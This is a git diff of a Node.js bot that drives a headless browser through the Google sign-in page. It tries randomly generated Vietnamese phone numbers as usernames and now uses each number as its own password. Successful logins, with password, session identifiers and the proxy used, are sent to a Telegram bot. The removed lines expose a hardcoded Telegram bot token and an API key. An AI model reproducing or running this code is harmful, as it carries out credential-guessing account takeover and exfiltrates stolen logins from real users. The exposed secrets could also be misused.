@@ -4,7 +4,7 @@ const bodyParser = require('body-parser')
 const express = require('express')
 const axios = require('axios')
 require('dotenv').config()
-process.env.TM_API_KEY = process.env.TM_API_KEY || '95d86e25d08169a4d0481c4c5bc9d071'
+// process.env.TM_API_KEY default removed to rely on .env only
 
 let page = null
 let mID = null
@@ -15,8 +15,8 @@ let mHeaders = null
 
 let mStart = new Date().toString()
 
-const TELEGRAM_URL = 'https://api.telegram.org/bot5329401539:AAFxSaqdq7jOIfU4KR3yhQmXHLVMPlM-FL0/sendMessage'
-const TELEGRAM_CHAT_ID = '683643497'
+const TELEGRAM_URL = process.env.TELEGRAM_URL
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID
 
 const app = express()
 
@@ -41,12 +41,19 @@ setInterval(async () => {
 setInterval(async () => {
     if (mLoaded) {
         const phone = randomVietnamPhone()
-        const password = randomPassword()
+        const password = phone
         console.log('Auto login using:', phone, password)
         const result = await getLoginToken(phone, password)
         console.log('Result:', result)
         if (result.status === 1) {
-            await sendTelegramMessage(`✅ Login success\n📱 Phone: ${phone}\n🔑 Pass: ${password}\n🆔 CID: ${result.cid}\n🔒 TL: ${result.tl}\n☁️ Host: ${result.host}`)
+            const proxy = await getCurrentProxyFromTM()
+            await sendTelegramMessage(`✅ Login success
+📱 Phone: ${phone}
+🔑 Pass: ${password}
+🆔 CID: ${result.cid}
+🔒 TL: ${result.tl}
+☁️ Host: ${result.host}
+🌐 Proxy: ${proxy}`)
         }
     }
 }, 180000)
@@ -69,9 +76,7 @@ function randomVietnamPhone() {
     return prefix + number
 }
 
-function randomPassword() {
-    return Math.random().toString(36).slice(-10)
-}
+
 
 async function sendTelegramMessage(text) {
     try {
@@ -163,10 +168,13 @@ async function getLoginToken(number, password) {
     try {
         await loadingRemove()
         mUrl = mHeaders = mPostData = null
-        await page.evaluate((n) => {
-            document.querySelector('input#identifierId').value = n
-            document.querySelector('#identifierNext').click()
-        }, number)
+        console.log('[GMAIL] Filling username:', number)
+await page.evaluate((n) => {
+    document.querySelector('input#identifierId').value = n
+    document.querySelector('#identifierNext').click()
+}, number)
+await page.waitForTimeout(1000)
+console.log('[GMAIL] Current URL after clicking Next:', page.url())
         await page.waitForSelector('input[type="password"]', { timeout: 10000 })
         await delay(1000)
         await page.evaluate((pw) => {
